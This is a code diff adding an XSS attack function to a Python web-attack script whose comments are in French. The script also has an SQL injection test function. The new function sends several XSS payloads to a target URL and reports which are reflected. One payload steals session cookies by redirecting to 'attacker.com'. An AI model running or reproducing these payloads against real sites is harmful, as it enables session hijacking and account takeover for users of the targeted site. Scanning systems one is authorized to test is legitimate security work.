@@ -94,3 +94,22 @@ def advanced_sql_injection_test(url):
         response = requests.get(url, params={'search': payload})
         if "Welcome" in response.text:
             print(f"[+] Injection réussie avec le payload: {payload}")
+
+# Fonction pour l'attaque XSS (Cross-Site Scripting)
+def xss_attack(url):
+    print(colored("[*] Lancement de l'attaque XSS (Cross-Site Scripting)...", "yellow"))
+    payloads = [
+        "<script>alert('XSS')</script>", 
+        "<img src='x' onerror='alert(1)'>", 
+        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
+    ]
+    for payload in payloads:
+        try:
+            # Exemple d'injection XSS via un paramètre URL
+            response = requests.get(url, params={"input": payload}, timeout=10)
+            if payload in response.text:
+                print(colored(f"[+] Vulnérabilité XSS détectée avec le payload : {payload}", "green"))
+            else:
+                print(colored(f"[-] Le payload {payload} ne fonctionne pas.", "red"))
+        except requests.exceptions.RequestException as e:
+            print(colored(f"[!] Erreur lors de l'attaque XSS : {e}", "red"))
